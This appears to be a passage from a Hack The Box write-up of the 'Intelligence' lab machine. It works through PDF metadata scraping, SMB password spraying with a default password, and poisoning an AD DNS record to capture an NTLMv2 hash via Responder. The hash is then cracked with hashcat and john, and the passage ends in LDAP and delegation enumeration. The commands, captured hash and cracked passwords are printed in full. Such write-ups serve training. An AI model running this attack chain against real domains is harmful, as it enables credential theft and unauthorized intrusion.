<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> shutil

url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://intelligence.htb/documents/&#39;</span>
folder <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;documents&#39;</span>

<span style="color:#ff79c6">for</span> m <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">13</span>):
    <span style="color:#ff79c6">for</span> d <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">32</span>):
        filename <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2020-</span><span style="color:#f1fa8c">%02d</span><span style="color:#f1fa8c">-</span><span style="color:#f1fa8c">%02d</span><span style="color:#f1fa8c">-upload.pdf&#39;</span> <span style="color:#ff79c6">%</span> (m, d)
        r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, stream<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
        <span style="color:#ff79c6">if</span> r<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;[DOWNLOAD] </span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>)
            <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;./</span><span style="color:#f1fa8c">{</span>folder<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/</span><span style="color:#f1fa8c">{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, <span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> f:
                r<span style="color:#ff79c6">.</span>raw<span style="color:#ff79c6">.</span>decode_content <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
                shutil<span style="color:#ff79c6">.</span>copyfileobj(r<span style="color:#ff79c6">.</span>raw, f)
</code></pre></td></tr></table>
</div>
</div><h2 id="pdf-extraction">PDF extraction</h2>
<p>The script download 84 documents, and looking at meta data, we can get possible names from the Creator metadata:</p>
<pre><code>$ exiftool documents/2020-01-01-upload.pdf
[..]
Creator                         : William.Lee
</code></pre>
<p>Looking at strings, allows to retrieve Creator names:</p>
<pre><code>$ python3 dump_pdf.py
$ strings * | grep Creator | cut -d'(' -f2 | cut -d')' -f1 | sort | uniq -c
  2 Anita.Roberts
  2 Brian.Baker
  1 Brian.Morris
  2 Daniel.Shelton
  1 Danny.Matthews
  1 Darryl.Harris
  5 David.Mcbride
  3 David.Reed
  2 David.Wilson
  5 Ian.Duncan
  2 Jason.Patterson
  4 Jason.Wright
  2 Jennifer.Thomas
  2 Jessica.Moody
  6 John.Coleman
  8 Jose.Williams
  2 Kaitlyn.Zimmerman
  2 Kelly.Long
  3 Nicole.Brock
  2 Richard.Williams
  3 Samuel.Richardson
  2 Scott.Scott
  4 Stephanie.Young
 84 TeX
  2 Teresa.Williamson
  1 Thomas.Hall
  3 Thomas.Valenzuela
  2 Tiffany.Molina
  3 Travis.Evans
  2 Veronica.Patel
  5 William.Lee
</code></pre>
<p>The content is mainly latin words, but to be sure and build a dictionary, I will convert those pdf into text files.</p>
<p>It may be cleaner to use exiftool but strings was faster:</p>
<pre><code>for i in documents/* ; do exiftool $i | grep Creator | cut -d':' -f2 &amp;&amp; done
</code></pre>
<h3 id="pdf-text-extraction">PDF Text extraction</h3>
<p>It is a bit tedious to open 84 files, let&rsquo;s convert into TEXT files then eliminate those containing latin words:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> glob
<span style="color:#ff79c6">import</span> PyPDF2

pdfs <span style="color:#ff79c6">=</span> glob<span style="color:#ff79c6">.</span>glob(<span style="color:#f1fa8c">&#34;./documents/*pdf&#34;</span>)

<span style="color:#ff79c6">for</span> pdf <span style="color:#ff79c6">in</span> pdfs:
    <span style="color:#8be9fd;font-style:italic">print</span>(pdf)
    pdfFileObj <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(pdf, <span style="color:#f1fa8c">&#39;rb&#39;</span>)
    pdfReader <span style="color:#ff79c6">=</span> PyPDF2<span style="color:#ff79c6">.</span>PdfFileReader(pdfFileObj)
    <span style="color:#8be9fd;font-style:italic">print</span>(pdfReader<span style="color:#ff79c6">.</span>numPages)
    pageObj <span style="color:#ff79c6">=</span> pdfReader<span style="color:#ff79c6">.</span>getPage(<span style="color:#bd93f9">0</span>)
    text <span style="color:#ff79c6">=</span> pageObj<span style="color:#ff79c6">.</span>extractText()
    <span style="color:#8be9fd;font-style:italic">print</span>(text)
    pdfFileObj<span style="color:#ff79c6">.</span>close()
</code></pre></td></tr></table>
</div>
</div><p>We find only 2 interesting document:</p>
<pre><code>$ python3 pdf2txt.py
$ pip3 install PyPDF2
[..]
./documents/2020-06-04-upload.pdf
[..]
./documents/2020-12-30-upload.pdf
</code></pre>
<p>Note 1</p>
<pre><code>New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
</code></pre>
<p>Note 2</p>
<pre><code>Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
</code></pre>
<p>Another way to extract text from PDF is to use textract</p>
<pre tabindex="0"><code>import textract

if len(sys.argv) &gt; 1:
    print(sys.argv[1])
    text = textract.process(sys.argv[1], method='pdfminer')
</code></pre><p>However it requires a lot more to install:</p>
<pre><code>$ brew cask install xquartz
$ brew install poppler antiword unrtf tesseract swig
$ pip3 install textract
</code></pre>
<h3 id="samba-tcp445-enumeration">samba TCP/445 Enumeration</h3>
<p>I was not able to login samba shares anonymously:</p>
<pre><code>smbclient -N -L 10.10.10.248
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre>
<p>Let&rsquo;s try with our new list of users:</p>
<pre><code>strings * | grep Creator | cut -d'(' -f2 | cut -d')' -f1 | sort | uniq &gt; list_users.txt
$ for i in `cat list_users.txt`; do echo NewIntelligenceCorpUser9876 | smbclient -U $i -L \\\\intelligence.htb ; done
Enter WORKGROUP\Anita.Roberts's password:
session setup failed: NT_STATUS_LOGON_FAILUR
[..]
Enter WORKGROUP\Tiffany.Molina's password:

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    IT              Disk
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
    Users           Disk
SMB1 disabled -- no workgroup available
Enter WORKGROUP\Travis.Evans's password
[..]
</code></pre>
<h2 id="samba-as-tiffany">Samba as Tiffany</h2>
<p>We visit the Users folder, and we can find the flag:</p>
<pre><code>smbclient -U Tiffany.Molina //intelligence.htb/Users
Enter WORKGROUP\Tiffany.Molina's password:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Mon Apr 19 09:20:26 2021
  ..                                 DR        0  Mon Apr 19 09:20:26 2021
  Administrator                       D        0  Mon Apr 19 08:18:39 2021
  All Users                         DHS        0  Sat Sep 15 15:21:46 2018
  Default                           DHR        0  Mon Apr 19 10:17:40 2021
  Default User                      DHS        0  Sat Sep 15 15:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 15:11:27 2018
  Public                             DR        0  Mon Apr 19 08:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 09:20:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 08:51:46 2021

                3770367 blocks of size 4096. 1423943 blocks available
smb: \&gt; cd Tiffany.Molina
smb: \Tiffany.Molina\&gt; cd Desktop
smb: \Tiffany.Molina\Desktop\&gt; dir
  .                                  DR        0  Mon Apr 19 08:51:46 2021
  ..                                 DR        0  Mon Apr 19 08:51:46 2021
  user.txt                           AR       34  Fri Oct 22 19:56:55 2021
smb: \Tiffany.Molina\Desktop\&gt; get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\&gt;
smb: \Tiffany.Molina\Desktop\&gt; !cat user.txt
4fc77e796f250c65ad1daf4be098bbb1
</code></pre>
<p>A friendly alternative to smbclient is to Mount the cifs shares for easier navigation, or use smbmount:</p>
<pre><code>sudo apt-get install cifs-utils
mkdir /mnt
sudo mount -t cifs //10.10.10.248/Users /mnt -o username=Tiffany.Molina,password=NewIntelligenceCorpUser9876
cat /mnt/Tiffany.Molina/Desktop/user.tx
sudo umount /mnt
sudo mount -t cifs //10.10.10.248/IT /mnt -o username=Tiffany.Molina,password=NewIntelligenceCorpUser9876
cat /mnt/downdetector.ps1
sudo umount /mnt
</code></pre>
<p>I am not able to login with evil-winrm:</p>
<pre><code>ruby evil-winrm.rb -i intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[..]
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
</code></pre>
<p>smbmap works better then smbclient to explore faster:</p>
<pre><code>$ smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] Finding open SMB ports....
[+] User SMB session established on intelligence.htb...
[+] IP: intelligence.htb:445    Name: unknown
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
    ADMIN$                                                  NO ACCESS       Remote Admin
    C$                                                      NO ACCESS       Default share
    .
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    InitShutdown
    fr--r--r--                5 Mon Jan  1 07:36:42 1601    lsass
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    ntsvcs
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    scerpc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-394-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    epmapper
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-1bc-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    LSM_API_service
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    eventlog
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-2d0-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    atsvc
    fr--r--r--                4 Mon Jan  1 07:36:42 1601    wkssvc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-4bc-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-24c-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-24c-1
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    RpcProxy\49691
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    69a91eae92e8a000
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    RpcProxy\593
    fr--r--r--                4 Mon Jan  1 07:36:42 1601    srvsvc
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    netdfs
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    vgauth-service
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    efsrpc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-244-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    W32TIME_ALT
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    cert
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-988-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-990-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-9a8-0
    IPC$                                                    READ ONLY       Remote IPC
    .
    dr--r--r--                0 Mon Apr 19 08:50:58 2021    .
    dr--r--r--                0 Mon Apr 19 08:50:58 2021    ..
    fr--r--r--             1046 Mon Apr 19 08:50:58 2021    downdetector.ps1
    IT                                                      READ ONLY
    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    ..
    NETLOGON                                                READ ONLY       Logon server share
    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    ..
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    intelligence.htb
    SYSVOL                                                  READ ONLY       Logon server share
    .
    dw--w--w--                0 Mon Apr 19 09:20:26 2021    .
    dw--w--w--                0 Mon Apr 19 09:20:26 2021    ..
    dr--r--r--                0 Mon Apr 19 08:18:39 2021    Administrator
    dr--r--r--                0 Mon Apr 19 11:16:30 2021    All Users
    dw--w--w--                0 Mon Apr 19 10:17:40 2021    Default
    dr--r--r--                0 Mon Apr 19 11:16:30 2021    Default User
    fr--r--r--              174 Mon Apr 19 11:15:17 2021    desktop.ini
    dw--w--w--                0 Mon Apr 19 08:18:39 2021    Public
    dr--r--r--                0 Mon Apr 19 09:20:26 2021    Ted.Graves
    dr--r--r--                0 Mon Apr 19 08:51:46 2021    Tiffany.Molina
    Users                                                   READ ONLY
</code></pre>
<p>There is a file downdetector.ps1 which sounds like the notification script in case of outage mentionned in the second note.</p>
<pre><code>smbclient -U Tiffany.Molina //intelligence.htb/IT
Enter WORKGROUP\Tiffany.Molina's password:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Apr 19 08:50:55 2021
  ..                                  D        0  Mon Apr 19 08:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021

                3770367 blocks of size 4096. 1422663 blocks available
smb: \&gt; get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \&gt; !cat downdetector.ps1
</code></pre>
<h2 id="retrieve-teds-ntlm-hash">Retrieve Ted&rsquo;s NTLM hash</h2>
<p>downdetector.ps1:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#50fa7b">#</span> <span style="color:#50fa7b">Check</span> <span style="color:#50fa7b">web</span> <span style="color:#50fa7b">server</span> <span style="color:#50fa7b">status.</span> <span style="color:#50fa7b">Scheduled</span> <span style="color:#50fa7b">to</span> <span style="color:#50fa7b">run</span> <span style="color:#50fa7b">every</span> <span style="color:#50fa7b">5min</span>
<span style="color:#50fa7b">Import-Module</span> <span style="color:#50fa7b">ActiveDirectory</span>
<span style="color:#50fa7b">foreach</span><span style="color:#f1fa8c">($record in Get-ChildItem &#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34; | Where-Object Name -like &#34;web*&#34;)</span>  {
  <span style="color:#50fa7b">try</span> {
    <span style="color:#50fa7b">$request</span> <span style="color:#50fa7b">=</span> <span style="color:#50fa7b">Invoke-WebRequest</span> <span style="color:#50fa7b">-Uri</span> <span style="color:#50fa7b">&#34;http:</span>/<span style="color:#8be9fd;font-style:italic">/$</span><span style="color:#f1fa8c">($record.Name)</span><span style="color:#50fa7b">&#34;</span> <span style="color:#50fa7b">-UseDefaultCredentials</span>
    <span style="color:#50fa7b">if</span><span style="color:#f1fa8c">(.StatusCode -ne 200)</span> {
      <span style="color:#50fa7b">Send-MailMessage</span> <span style="color:#50fa7b">-From</span> <span style="color:#50fa7b">&#39;Ted</span> <span style="color:#50fa7b">Graves</span> &lt;<span style="color:#50fa7b">Ted.Graves@intelligence.htb</span>&gt;<span style="color:#50fa7b">&#39;</span> <span style="color:#50fa7b">-To</span> <span style="color:#50fa7b">&#39;Ted</span> <span style="color:#50fa7b">Graves</span> &lt;<span style="color:#50fa7b">Ted.Graves@intelligence.htb</span>&gt;<span style="color:#50fa7b">&#39;</span> <span style="color:#50fa7b">-Subject</span> <span style="color:#50fa7b">&#34;Host:</span> <span style="color:#50fa7b">$</span><span style="color:#f1fa8c">($record.Name)</span> <span style="color:#50fa7b">is</span> <span style="color:#50fa7b">down&#34;</span>
    }
  } <span style="color:#50fa7b">catch</span> {}
}
</code></pre></td></tr></table>
</div>
</div><p>The powershell script collect web records from ActiveDirectory and attempt to load the page. If HTTP code is not 200 (SUCCESS), then it send an email.
The interesting part of the script are:</p>
<ul>
<li>the web* record enumeration from AD.</li>
<li>the comment saying it is a cron job running every 5min</li>
</ul>
<p>There is a clear attack vector here: if we manage to create a dns record starting with web* and pointing to my attacker machine, then I would be able to either get IT Support guy Ted&rsquo;s hashes. It worth to explore AD and figure out if this is possible to add DNS records.</p>
<p>By default Windows ADIDNS (Active Directory Integrated DNS) zones allow any authenticated users to add/ modify/ delete DNS entries. Using this any user account in the AD can add new DNS records.</p>
<p><a href="https://github.com/Sagar-Jangam/DNSUpdate">DNSUpdate</a> is a python script to aid Responder in gathering more hashes, even from different VLANs, which by default is not possible with Responder. The scripts does so by updating DNS entries in ADIDNS zones. The script requires a set of valid domain credentials (User account/ Machine account with a password or hash) to update the ADIDNS zones.</p>
<pre><code>git clone https://github.com/Sagar-Jangam/DNSUpdate.git
cd DNSUpdate
pip3 install -r requirements.txt
</code></pre>
<ul>
<li>
<p>The script can be used with Responder&rsquo;s logs in analyze mode to identify records which have been requested by multiple hosts. These records are likely to be requested by hosts in other VLANs as well. Thus modifying the zones with these records (and pointing to Responder&rsquo;s IP) may allow us to gather hashes from different VLANs.</p>
</li>
<li>
<p>The script can also be used to add Wildcard DNS records which makes DNS works just as LLMNR and NBNS (which means all unresolved records would fall down to the wildcard record and thus resolve to Responder&rsquo;s IP).</p>
<pre><code>  python3 DNSUpdate.py -DNS 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r webevilrecord -d 10.10.14.10
  Connecting to host...
  Binding to host
  Bind OK
  Adding the record
  {'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'addResponse'}
</code></pre>
</li>
</ul>
<p>Now we wait up-to 5 minutes for the cronjob with a responder listener and we cross fingers:</p>
<pre><code>sudo ./Responder.py -I eth0 -w -F
[..]
[+] Listening for events...

[HTTP] NTLMv2 Client   : 172.19.0.1
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:443211421179eceb:33E6EAAB028DE81EA80CE71299BFBA5D:0101000000000000B9B60E60D9C8D7014798886EB0254F8400000000020008004F004E0042004D0001001E00570049004E002D005600410033003600570049004F005000310032005700040014004F004E0042004D002E004C004F00430041004C0003003400570049004E002D005600410033003600570049004F0050003100320057002E004F004E0042004D002E004C004F00430041004C00050014004F004E0042004D002E004C004F00430041004C000800300030000000000000000000000000200000FD2DE1F77CDFB1D2825155B7318DE5483DB75260F8780517ED924D759490736E0A001000000000000000000000000000000000000900460048005400540050002F007700650062006500760069006C007200650063006F00720064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</code></pre>
<p><a href="https://github.com/dirkjanm/krbrelayx.git">krbrelayx</a> is another tool to abuse <strong>unconstrained</strong> delegation. It has a <code>dnstool.py</code> that can Add/modify/delete Active Directory Integrated DNS records via LDAP:</p>
<pre><code>python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r web.intelligence.htb -d 10.10.14.10 10.10.10.248
ligence.htb -d 10.10.14.10 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
</code></pre>
<h3 id="crack-teds-password">crack Ted&rsquo;s password</h3>
<p>It took only one minute for hashcat to crack the hash with rockyou dictionary:</p>
<pre><code>cat Responder/logs/*txt &gt; ~/hashes.txt
hashcat -m 5600  ~/hashes.txt /opt/dictionaries/rockyou.txt -o ~/cracked.txt --force
tail -1 ~/cracked.txt| cut -d':' -f 7
Mr.Teddy
</code></pre>
<p>john was even faster, below 26 seconds, and could guess the hash format.</p>
<pre><code>/opt/john/run/john ~/hashes.txt --wordlist=/opt/dictionaries/rockyou.txt
/opt/john/run/john ~/hashes.txt --show --format=netntlmv2
Ted.Graves:Mr.Teddy:intelligence:443211421179eceb:33E6EAAB028DE81EA80CE71299BFBA5D:0101000000000000B9B60E60D9C8D7014798886EB0254F8400000000020008004F004E0042004D0001001E00570049004E002D005600410033003600570049004F005000310032005700040014004F004E0042004D002E004C004F00430041004C0003003400570049004E002D005600410033003600570049004F0050003100320057002E004F004E0042004D002E004C004F00430041004C00050014004F004E0042004D002E004C004F00430041004C000800300030000000000000000000000000200000FD2DE1F77CDFB1D2825155B7318DE5483DB75260F8780517ED924D759490736E0A001000000000000000000000000000000000000900460048005400540050002F007700650062006500760069006C007200650063006F00720064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</code></pre>
<p>We are not able to login as ted.graves with evil-winrm</p>
<h2 id="ldap-enumeration">LDAP enumeration</h2>
<pre tabindex="0"><code>sudo apt install ldap-utils
ldapsearch -h 10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
</code></pre><p>We found two interesting domains that both resolve to this machine:</p>
<pre><code>dig @10.10.10.248 ForestDnsZones.intelligence.htb
dig @10.10.10.248 DomainDnsZones.intelligence.htb
</code></pre>
<p>We can also dump everything:</p>
<pre><code>ldapdomaindump -u INTELLIGENCE.HTB\\Tiffany.Molina  -p NewIntelligenceCorpUser9876 10.10.10.248
[..]
[+] Domain dump finished
$ls domain_*json
domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json  domain_users.json
</code></pre>
<p>In domain_users, few accounts pop-out, because of the whenChanged date field:</p>
<table>
<thead>
<tr>
<th>cn</th>
<th>sAMAccountName</th>
<th>primaryGroupId</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ted Graves</td>
<td>Ted.Graves</td>
<td>IT Support</td>
</tr>
<tr>
<td>Tiffany Molina</td>
<td>Tiffany.Molina</td>
<td></td>
</tr>
<tr>
<td>krbtgt</td>
<td>krbtgt</td>
<td>Replication Group</td>
</tr>
<tr>
<td>Administrator</td>
<td>Administrator</td>
<td>Group Policy Creator Owners, Domain Admins, Enterprise Admins, Schema Admins, Administrators</td>
</tr>
</tbody>
</table>
<p>In domain_computers, we find a workstation authorized for delegation. On AD, accounts, whether users or machines are being given permissions in the same way.</p>
<table>
<thead>
<tr>
<th>cn</th>
<th>sAMAccountName</th>
<th>dNSHostName</th>
<th>userAccountControl</th>
<th>objectSid</th>
</tr>
</thead>
<tbody>
<tr>
<td>svc_int</td>
<td>svc_int$</td>
<td>svc_int.intelligence.htb</td>
<td>WORKSTATION_ACCOUNT, <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
<td>S-1-5-21-4210132550-3389855604-3437519686-1144</td>
</tr>
</tbody>
</table>
<p>Another attack vector here, if we get a footprint on svc_int, We may be able to authenticate some other services or machines.</p>
<h2 id="ad-enumeration">AD Enumeration</h2>
<p>The following resources explain <strong>constrained delegation</strong> (as opposed to legacy way <strong>unconstrained delegation</strong>):</p>
<ul>
<li>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">Kerberos Constrained Delegation</a></p>
<pre><code>TRUSTED_TO_AUTH_FOR_DELEGATION - (Windows 2000/Windows Server 2003) The account is enabled for delegation.
This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled.
This setting lets a service that runs under the account assume a client's identity and authenticate
as that user to other remote servers on the network.
</code></pre>
</li>
<li>
<p><a href="https://www.onsecurity.io/blog/abusing-kerberos-from-linux/">Abusing Kerberos From Linux</a></p>
</li>
<li>
<p><a href="https://pypi.org/project/pywerview/">Pywerview</a> is Powershell from Linux. It&rsquo;s a complete rewrite of <a href="https://github.com/PowerShellMafia/PowerSploit">Powersploit</a>&rsquo;s <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">Powerview</a> unsing the incredible impacket, and it is easier to use from our attacker machine which has not yet joined the domain.</p>
<pre><code>  git clone https://github.com/the-useless-one/pywerview
  cd pywerview
  sudo python3 setup.py install
</code></pre>
</li>
</ul>
<p>We find consistent results aligned with our ldap enumeration: No users has delegation privileges, machine svc_int has delegation privileges.</p>
<pre><code>$ pywerview get-netuser -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb | grep msds-allowedtodelegateto
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb
dnshostname: svc_int.intelligence.htb
dnshostname: dc.intelligence.htb
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb  --computername svc_int.intelligence.htb --full-data
[..]
